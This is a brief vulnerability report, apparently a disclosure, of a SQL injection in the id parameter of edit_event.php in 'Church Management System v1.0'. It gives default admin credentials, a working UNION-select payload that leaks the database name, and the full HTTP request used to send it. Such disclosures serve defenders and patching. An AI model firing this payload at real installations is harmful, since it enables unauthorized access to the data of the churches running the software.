# Church Management System v1.0 by Godfrey De Blessed has SQL injection

BUG_Author: Broccoli

Login account: admin/admin (Super Admin account)

vendors: https://www.sourcecodester.com/php/11206/church-management-system.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /cman/admin/edit_event.php?id=

Vulnerability location: /cman/admin/edit_event.php?id=, id

dbname = cman

[+] Payload: /cman/admin/edit_event.php?id=-1%27%20union%20select%201,database(),3,4--+ // Leak place ---> id

```sql
GET /cman/admin/edit_event.php?id=-1%27%20union%20select%201,database(),3,4--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=fjhrjdpuej6edqv5haoadpj3lc
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/183248956-e78a8e7c-a26a-4c98-b104-864758d62d04.png)
